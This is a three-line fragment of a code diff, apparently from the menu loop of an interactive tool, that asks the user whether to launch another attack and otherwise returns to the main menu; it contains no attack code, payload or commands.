+            continue_attack = UI.input_prompt("Launch another attack? (y/n)")
+            if continue_attack.lower() != 'y':
+                UI.success("Returning to main menu...
